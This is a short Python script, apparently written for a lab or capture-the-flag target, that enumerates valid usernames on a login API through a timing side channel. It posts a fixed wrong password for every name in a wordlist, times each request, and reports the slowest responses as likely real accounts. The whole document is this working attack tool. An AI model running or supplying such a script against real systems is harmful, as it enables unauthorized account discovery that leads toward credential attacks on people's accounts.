# my script to bruteforce usernames using timing
import requests as r
import time
import json


URL = 'http://<remote-ip>/api/user/login' # insert remote ip here
USERNAME_FILE = open("names.txt", "r")
usernames = []


for line in USERNAME_FILE:  # read in usernames from the wordlist
    usernames.append(line.replace("\n", ""))


timings = dict()


# make request to api
def doLogin(user):
    creds = {"username":user,"password":"invalidPassword!"}
    response = r.post(URL,json=creds)
    if response.status_code != 200: # this means there is an error
        print("Error:", response.status_code)


print("Starting all POST requests")


for user in usernames:
    # Do a request for every user in the list, and time how long it takes
    startTime = time.time()
    doLogin(user)
    endTime = time.time()
    # record the time for this user along with the username
    timings[user] = endTime - startTime
    # Wait to avoid DoSing the server which causes unreliable results
    time.sleep(0.01)


print("Finshed all POST requests")


# Longer times normally mean valid usernames as passwords were verified
largestTime = max(timings.values())
smallestTime = min(timings.values())
# Ideally the smallest times should be near instant, and largest should be 1+ seconds
print("Time delta:", largestTime-smallestTime, "seconds (larger is better)")


# A valid username means the server will hash the password
# As this takes time, the longer requests are likely to be valid users
# The longer the request took, the more likely the request is to be valid.
for user, time in timings.items():
    if time >= largestTime * 0.9:
        # with 10% time tolerence
        print(user, "is likely to be valid")

